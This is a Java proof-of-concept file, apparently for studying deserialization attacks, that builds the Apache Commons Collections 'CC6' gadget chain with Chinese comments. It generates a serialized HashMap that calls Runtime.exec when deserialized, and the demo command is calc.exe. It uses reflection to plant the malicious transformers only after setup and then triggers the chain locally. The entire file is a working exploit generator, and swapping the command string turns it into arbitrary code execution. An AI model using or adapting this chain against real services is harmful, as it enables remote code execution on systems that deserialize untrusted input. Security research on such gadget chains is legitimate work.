package cc.saferoad.deserialization;/*
@auther S0cke3t
@date 2022-01-21
*/

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CommonCollection6POC {
    public static void main(String[] args) throws Exception{
        Transformer[] safetransformers = new Transformer[]{};
        Transformer[] transformers = new Transformer[]{
                //获取Runtime
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[0]}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),
                new InvokerTransformer("exec",new Class[]{String.class},new String[]{"calc.exe"}),
        };
        //先设置安全transform,防止调试触发
        Transformer transformerChain = new ChainedTransformer(safetransformers);
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap,transformerChain);
        TiedMapEntry tme = new TiedMapEntry(outerMap,"keykey");
        Map expMap = new HashMap();
        expMap.put(tme,"value");
        //移除键值触发恶意transform
        outerMap.remove("keykey");
        //设置恶意transform
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain,transformers);
        // ⽣成序列化字符串
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(expMap);
        oos.close();
        // 本地测试触发
        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
}
